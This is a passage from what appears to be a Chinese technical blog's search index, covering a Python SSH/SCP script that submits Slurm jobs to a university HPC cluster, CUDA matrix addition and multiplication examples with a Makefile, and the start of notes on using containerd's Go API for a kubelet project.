scp.get(<span class=\"string\">f&quot;~/<span class=\"subst\">&#123;job_name&#125;</span>/result&quot;</span>,recursive=<span class=\"literal\">True</span>,local_path=<span class=\"string\">f&quot;<span class=\"subst\">&#123;source_path&#125;</span>/&quot;</span>)</span><br><span class=\"line\">    scp.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">submit_job</span>():</span><br><span class=\"line\">    t = <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> t:</span><br><span class=\"line\">        s = ssh.invoke_shell()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;starting ssh&quot;</span>)</span><br><span class=\"line\">        sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">        recv = s.recv(NREAD).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> recv.find(<span class=\"string\">&quot;stu1648&quot;</span>) == -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;start ssh failed,retrying&quot;</span>)</span><br><span class=\"line\">            t -= <span class=\"number\">1</span></span><br><span class=\"line\">            sleep(<span class=\"number\">5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;start ssh success&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;sending sbatch&quot;</span>)</span><br><span class=\"line\">        s.send(<span class=\"string\">f&quot;cd ~/<span class=\"subst\">&#123;job_name&#125;</span> &amp;&amp; sbatch ./<span class=\"subst\">&#123;job_name&#125;</span>.slurm\\n&quot;</span>)</span><br><span class=\"line\">        sleep(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        recv = s.recv(NREAD).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        index = recv.find(job_submit_tag)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> index ==-<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(recv)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;sbatch failed,retrying&quot;</span>)</span><br><span class=\"line\">            t -= <span class=\"number\">1</span></span><br><span class=\"line\">            sleep(<span class=\"number\">5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;sbatch success&quot;</span>)</span><br><span class=\"line\">        job_id = recv[index+<span class=\"built_in\">len</span>(job_submit_tag)+<span class=\"number\">1</span>:recv.index(line_finish_tag)-<span class=\"number\">2</span>]</span><br><span class=\"line\">        <span class=\"comment\">#job_id = 25099457</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;job_id=&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;start checking job status&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        check_status_cmd = <span class=\"string\">f&quot;sacct | grep <span class=\"subst\">&#123;job_id&#125;</span> | awk &#x27;&#123;&#123;print $6&#125;&#125;&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            s.send(check_status_cmd+<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">            sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            recv = s.recv(NREAD).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">            status = recv[recv.index(check_status_cmd)+<span class=\"built_in\">len</span>(check_status_cmd)+<span class=\"number\">2</span>:recv.index(line_finish_tag)-<span class=\"number\">2</span>]</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;status=&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> status.find(FAILED)!=-<span class=\"number\">1</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;job failed&quot;</span>)</span><br><span class=\"line\">                <span class=\"comment\">#user might need error message, still get results</span></span><br><span class=\"line\">                <span class=\"comment\">#exit(0)</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> job_id</span><br><span class=\"line\">            <span class=\"keyword\">if</span> status.find(COMPLETED)==-<span class=\"number\">1</span>:</span><br><span class=\"line\">                sleep(<span class=\"number\">10</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> job_id</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">generate_slurm()</span><br><span class=\"line\">upload_source()</span><br><span class=\"line\">job_id =  submit_job()</span><br><span class=\"line\"><span class=\"keyword\">if</span> job_id:</span><br><span class=\"line\">    download_result(job_id)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;finish&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由于containerd目前的使用是直接把所有容器的输出定为stdout，并没有用类似nerdctl支持-d和logs。这样会把python程序的输出都直接放到屏幕上，这样也方便观察结果，可以认为是个feature。</p>\n<p>如果源数据文件比较大，scp上传需要花不少时间</p>\n<h2 id=\"CUDA程序\"><a href=\"#CUDA程序\" class=\"headerlink\" title=\"CUDA程序\"></a>CUDA程序</h2><p>交我算只适合提交自己确认正确的程序，因为几乎全是pending，完全无法动态调试。每天晚上十一点之后会稍微好一点。</p>\n<p><a href=\"https://colab.research.google.com/github/hussain0048/C-Plus-Plus/blob/master/Basic_of_C%2B%2B.ipynb\">Google Colab</a>用这个可以有cuda环境来调试</p>\n<p>由于希望支持的GPU应用是有意义的，所以需要满足两点：</p>\n<ol>\n<li>数据量大</li>\n<li>由用户自己提供输入，以文件形式获得输出</li>\n</ol>\n<p>故添加文件输入输出模块，并提前准备好测试数据。</p>\n<p>为了编译任务快速结束以便展示并且减轻交我算平台的压力，这里还是选择只使用10000*10000的矩阵</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;files.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> N 10000</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> size = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>)N*N*<span class=\"keyword\">sizeof</span>(<span class=\"type\">double</span>);</span><br><span class=\"line\">  <span class=\"type\">double</span> *a = (<span class=\"type\">double</span>*)<span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"type\">double</span> *b = (<span class=\"type\">double</span>*)<span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N; ++row )&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N; ++col )&#123;</span><br><span class=\"line\">      a[row*N + col] = row;</span><br><span class=\"line\">      b[row*N + col] = col+<span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  write_values_to_file(<span class=\"string\">&quot;matrix_a_data&quot;</span>,a,size);</span><br><span class=\"line\">  write_values_to_file(<span class=\"string\">&quot;matrix_b_data&quot;</span>,b,size);</span><br><span class=\"line\"></span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_a_data&quot;</span>,a,size);</span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_b_data&quot;</span>,b,size);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N; ++row )&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N; ++col )&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(a[row*N + col] != row ||b[row*N + col] != col+<span class=\"number\">2</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;error\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;generate data success\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"矩阵加法\"><a href=\"#矩阵加法\" class=\"headerlink\" title=\"矩阵加法\"></a>矩阵加法</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;files.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CHECK_CORRECTNESS</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> N  10000</span></span><br><span class=\"line\"></span><br><span class=\"line\">__global__ <span class=\"type\">void</span> <span class=\"title function_\">matrixAddGPU</span><span class=\"params\">( <span class=\"type\">double</span> * a, <span class=\"type\">double</span> * b, <span class=\"type\">double</span> * c )</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> row_begin = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class=\"line\">  <span class=\"type\">int</span> col_begin = blockIdx.y * blockDim.y + threadIdx.y;</span><br><span class=\"line\">  <span class=\"type\">int</span> stride_row = gridDim.x * blockDim.x;</span><br><span class=\"line\">  <span class=\"type\">int</span> stride_col = gridDim.y * blockDim.y;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> row = row_begin; row &lt; N ;row += stride_row) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> col= col_begin; col&lt; N ; col+= stride_col) &#123;</span><br><span class=\"line\">                c[row * N + col] = a[row*N+col] + b[row*N+col];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">matrixAddCPU</span><span class=\"params\">( <span class=\"type\">double</span> * a, <span class=\"type\">double</span> * b, <span class=\"type\">double</span> * c )</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N; ++row )</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N; ++col )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      c[row * N + col] = a[row*N+col]+b[row*N+col];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        cudaError_t cudaStatus;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> deviceId;</span><br><span class=\"line\">  <span class=\"type\">int</span> numberOfSMs;</span><br><span class=\"line\"></span><br><span class=\"line\">  cudaGetDevice(&amp;deviceId);</span><br><span class=\"line\">  cudaDeviceGetAttribute(&amp;numberOfSMs, cudaDevAttrMultiProcessorCount, deviceId);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;SM:%d\\n&quot;</span>,numberOfSMs);<span class=\"comment\">//80</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">double</span> *a, *b, *c_gpu;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> size = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>)N * N * <span class=\"keyword\">sizeof</span> (<span class=\"type\">double</span>); <span class=\"comment\">// Number of bytes of an N x N matrix</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Allocate memory</span></span><br><span class=\"line\">  cudaMallocManaged (&amp;a, size);</span><br><span class=\"line\">  cudaMallocManaged (&amp;b, size);</span><br><span class=\"line\">  cudaMallocManaged (&amp;c_gpu, size);</span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_a_data&quot;</span>, a, size);</span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_b_data&quot;</span>, b, size);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//if too large,invalid configuration argument</span></span><br><span class=\"line\">  dim3 <span class=\"title function_\">threads_per_block</span><span class=\"params\">(<span class=\"number\">32</span>,<span class=\"number\">32</span>,<span class=\"number\">1</span>)</span>;</span><br><span class=\"line\">  dim3 <span class=\"title function_\">number_of_blocks</span> <span class=\"params\">(<span class=\"number\">16</span>*numberOfSMs,<span class=\"number\">16</span>*numberOfSMs, <span class=\"number\">1</span>)</span>;</span><br><span class=\"line\">  cudaMemPrefetchAsync(a, size, deviceId);</span><br><span class=\"line\">  cudaMemPrefetchAsync(b, size, deviceId);</span><br><span class=\"line\">  cudaMemPrefetchAsync(c_gpu, size, deviceId);</span><br><span class=\"line\">  matrixAddGPU &lt;&lt;&lt; number_of_blocks, threads_per_block &gt;&gt;&gt; ( a, b, c_gpu );</span><br><span class=\"line\">        cudaStatus = cudaGetLastError();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cudaStatus != cudaSuccess) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;call matrixAddGPU error: %s\\n&quot;</span>, cudaGetErrorString(cudaStatus));</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  cudaDeviceSynchronize(); <span class=\"comment\">// Wait for the GPU to finish before proceeding</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Call the CPU version to check our work</span></span><br><span class=\"line\">    <span class=\"comment\">// Compare the two answers to make sure they are equal</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> error = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">ifdef</span> CHECK_CORRECTNESS</span></span><br><span class=\"line\">    <span class=\"type\">double</span> *c_cpu;</span><br><span class=\"line\">    cudaMallocManaged (&amp;c_cpu, size);</span><br><span class=\"line\">    matrixAddCPU( a, b, c_cpu );</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N &amp;&amp; !error; ++row )</span><br><span class=\"line\">      <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N &amp;&amp; !error; ++col )</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c_cpu[row * N + col] != c_gpu[row * N + col])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;FOUND ERROR at c[%d][%d]\\n&quot;</span>, row, col);</span><br><span class=\"line\">          error = <span class=\"literal\">true</span>;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    cudaFree( c_cpu );</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!error)</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Success!\\n&quot;</span>);</span><br><span class=\"line\">  write_values_to_file(<span class=\"string\">&quot;result/matrix_c_data&quot;</span>, c_gpu, size);</span><br><span class=\"line\">  <span class=\"comment\">// Free all our allocated memory</span></span><br><span class=\"line\">  cudaFree(a);</span><br><span class=\"line\">  cudaFree(b);</span><br><span class=\"line\">  cudaFree( c_gpu );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"矩阵乘法\"><a href=\"#矩阵乘法\" class=\"headerlink\" title=\"矩阵乘法\"></a>矩阵乘法</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;files.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CHECK_CORRECTNESS</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> N  10000</span></span><br><span class=\"line\"></span><br><span class=\"line\">__global__ <span class=\"type\">void</span> <span class=\"title function_\">matrixMulGPU</span><span class=\"params\">( <span class=\"type\">double</span> * a, <span class=\"type\">double</span> * b, <span class=\"type\">double</span> * c )</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> row_begin = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class=\"line\">  <span class=\"type\">int</span> col_begin = blockIdx.y * blockDim.y + threadIdx.y;</span><br><span class=\"line\">  <span class=\"type\">int</span> stride_row = gridDim.x * blockDim.x;</span><br><span class=\"line\">  <span class=\"type\">int</span> stride_col = gridDim.y * blockDim.y;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> row = row_begin; row &lt; N ;row += stride_row) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> col= col_begin; col&lt; N ; col+= stride_col) &#123;</span><br><span class=\"line\">                <span class=\"type\">double</span> val = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span>(<span class=\"type\">int</span> k = <span class=\"number\">0</span>; k &lt; N; ++k )&#123;</span><br><span class=\"line\">                        val += a[row * N + k] * b[k * N + col];</span><br><span class=\"line\">                        c[row * N + col] = val;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">matrixMulCPU</span><span class=\"params\">( <span class=\"type\">double</span> * a, <span class=\"type\">double</span> * b, <span class=\"type\">double</span> * c )</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N; ++row )</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N; ++col )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"type\">double</span> val = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( <span class=\"type\">int</span> k = <span class=\"number\">0</span>; k &lt; N; ++k )</span><br><span class=\"line\">        val += a[row * N + k] * b[k * N + col];</span><br><span class=\"line\">      c[row * N + col] = val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        cudaError_t cudaStatus;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> deviceId;</span><br><span class=\"line\">  <span class=\"type\">int</span> numberOfSMs;</span><br><span class=\"line\"></span><br><span class=\"line\">  cudaGetDevice(&amp;deviceId);</span><br><span class=\"line\">  cudaDeviceGetAttribute(&amp;numberOfSMs, cudaDevAttrMultiProcessorCount, deviceId);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;SM:%d\\n&quot;</span>,numberOfSMs);<span class=\"comment\">//80</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">double</span> *a, *b, *c_gpu;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> size = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>)N * N * <span class=\"keyword\">sizeof</span> (<span class=\"type\">double</span>); <span class=\"comment\">// Number of bytes of an N x N matrix</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Allocate memory</span></span><br><span class=\"line\">  cudaMallocManaged (&amp;a, size);</span><br><span class=\"line\">  cudaMallocManaged (&amp;b, size);</span><br><span class=\"line\">  cudaMallocManaged (&amp;c_gpu, size);</span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_a_data&quot;</span>, a, size);</span><br><span class=\"line\">  read_values_from_file(<span class=\"string\">&quot;matrix_b_data&quot;</span>, b, size);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//if too large,invalid configuration argument</span></span><br><span class=\"line\">  dim3 <span class=\"title function_\">threads_per_block</span><span class=\"params\">(<span class=\"number\">32</span>,<span class=\"number\">32</span>,<span class=\"number\">1</span>)</span>;</span><br><span class=\"line\">  dim3 <span class=\"title function_\">number_of_blocks</span> <span class=\"params\">(<span class=\"number\">16</span>*numberOfSMs,<span class=\"number\">16</span>*numberOfSMs, <span class=\"number\">1</span>)</span>;</span><br><span class=\"line\">  cudaMemPrefetchAsync(a, size, deviceId);</span><br><span class=\"line\">  cudaMemPrefetchAsync(b, size, deviceId);</span><br><span class=\"line\">  cudaMemPrefetchAsync(c_gpu, size, deviceId);</span><br><span class=\"line\">  matrixMulGPU &lt;&lt;&lt; number_of_blocks, threads_per_block &gt;&gt;&gt; ( a, b, c_gpu );</span><br><span class=\"line\">        cudaStatus = cudaGetLastError();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cudaStatus != cudaSuccess) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;call matrixAddGPU error: %s\\n&quot;</span>, cudaGetErrorString(cudaStatus));</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  cudaDeviceSynchronize(); <span class=\"comment\">// Wait for the GPU to finish before proceeding</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Call the CPU version to check our work</span></span><br><span class=\"line\">    <span class=\"comment\">// Compare the two answers to make sure they are equal</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> error = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">ifdef</span> CHECK_CORRECTNESS</span></span><br><span class=\"line\">    <span class=\"type\">double</span> *c_cpu;</span><br><span class=\"line\">    cudaMallocManaged (&amp;c_cpu, size);</span><br><span class=\"line\">    matrixMulCPU( a, b, c_cpu );</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"type\">int</span> row = <span class=\"number\">0</span>; row &lt; N &amp;&amp; !error; ++row )</span><br><span class=\"line\">      <span class=\"keyword\">for</span>( <span class=\"type\">int</span> col = <span class=\"number\">0</span>; col &lt; N &amp;&amp; !error; ++col )</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c_cpu[row * N + col] != c_gpu[row * N + col])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;FOUND ERROR at c[%d][%d]\\n&quot;</span>, row, col);</span><br><span class=\"line\">          error = <span class=\"literal\">true</span>;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    cudaFree( c_cpu );</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!error)</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Success!\\n&quot;</span>);</span><br><span class=\"line\">  write_values_to_file(<span class=\"string\">&quot;result/matrix_c_data&quot;</span>, c_gpu, size);</span><br><span class=\"line\">  <span class=\"comment\">// Free all our allocated memory</span></span><br><span class=\"line\">  cudaFree(a);</span><br><span class=\"line\">  cudaFree(b);</span><br><span class=\"line\">  cudaFree( c_gpu );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h3><figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">build:</span></span><br><span class=\"line\">        nvcc -o matrix-mul matrix-mul.cu -I .</span><br><span class=\"line\"><span class=\"section\">run:</span></span><br><span class=\"line\">        ./matrix-mul</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>-I 表示在当前目录寻找include的头文件</p>\n","categories":["misc"]},{"title":"kubelet","url":"/2024/01/22/misc/kubelet/","content":"<h1 id=\"kubelet\"><a href=\"#kubelet\" class=\"headerlink\" title=\"kubelet\"></a>kubelet</h1><h2 id=\"containerd\"><a href=\"#containerd\" class=\"headerlink\" title=\"containerd\"></a>containerd</h2><p><a href=\"https://github.com/containerd/containerd/blob/main/docs/getting-started.md\">containerd&#x2F;getting-started.md at main · containerd&#x2F;containerd (github.com)</a></p>\n<p>镜像自带，但需要安装cni，高版本没有自带的flannel，用0.9.1版本可以</p>\n<h3 id=\"management\"><a href=\"#management\" class=\"headerlink\" title=\"management\"></a>management</h3><p>管理容器，考虑以下三种方法：</p>\n<ol>\n<li><p>containerd启动时会作为grpc server，监听在<code>unix:///run/containerd/containerd.sock</code> 可以像k8s一样作为grpc client调定义好的CRI接口。但是我们不需要考虑项目不同模块解耦，也不需要考虑支持其他的容器运行时，对于grpc的调用需要自己构造参数，太复杂，并且试了一下很难跑起来。</p>\n</li>\n<li><p>用exec+ctl</p>\n<p>这里可以使用containerd写的nerdctl 兼容docker的命令行格式</p>\n<p><a href=\"https://github.com/containerd/nerdctl\">containerd&#x2F;nerdctl: contaiNERD CTL - Docker-compatible CLI for containerd, with support for Compose, Rootless, eStargz, OCIcrypt, IPFS, … (github.com)</a></p>\n<p>完全用cli工具技术含量不高，且需要经过nerdctl这个大框架的解析，效率不高。</p>\n<p>可以做一些辅助用途，比如测试、启动pause等。核心的查看容器状态和启动容器还是用containerd的go api</p>\n</li>\n<li><p>containerd api</p>\n<p>实在难用，官方文档一共就readme的几句话，剩下的全靠看源码+猜+看nerdctl源码如何使用</p>\n</li>\n</ol>\n<p>这里研究出的api如下</p>\n<ul>\n<li>创建容器 包括配置</li>\n<li>销毁容器</li>\n<li>获取容器状态</li>\n<li>获取容器资源信息</li>\n</ul>\n<h3 id=\"configuration\"><a href=\"#configuration\" class=\"headerlink\" title=\"configuration\"></a>configuration</h3><ul>\n<li><p><code>WithMounts</code> 挂载 需要将type和options同时设为bind，否则会报<code>no such device</code>的错</p>\n</li>\n<li><p><code>WithDomainname</code> <code>WithHostname</code></p>\n</li>\n<li><p><code>WithLinuxNamespace</code>可以加入其他进程的namespace 但是需要先起task 拿到pid<code>proc/pid/ns/uts</code></p>\n<p>启动pause容器后，将此pod内的所有其他容器加入到pause容器的namespace<br>观察containerd的源码可知，就算什么都不配置，默认也是使用了ipc、uts、network、mount、pid这五个命名空间隔离的<br><a href=\"https://blog.csdn.net/weixin_40579389/article/details/125941366\">k8s之pause容器</a>按这篇文章的意思 除了mount其他都不需要和pause隔离<br>需要修改的话 一种是自己写配置函数，另一种是使用这个api但只能一个个单独设 </p>\n</li>\n<li><p><code>WithProcessArgs</code> 启动命令 只有windows支持<code>ProcessCmdLine</code> 不过简单的命令使用起来效果差不多，具体可能涉及到entrypoint 和cmd的区别</p>\n</li>\n<li><p><code>Withenv</code>  环境变量 <code>&quot;a=c&quot;</code> </p>\n</li>\n<li><p><code>WithMemoryLimit</code> 单位是字节，如果容器使用内存超过这个数 会被直接kill。</p>\n<p>莫名其妙会有bug，报cgroup的错，全网查不到信息，使用“30Mi” 没问题</p>\n</li>\n<li><p>CPU：</p>\n<ul>\n<li><code>WithCPUs</code> 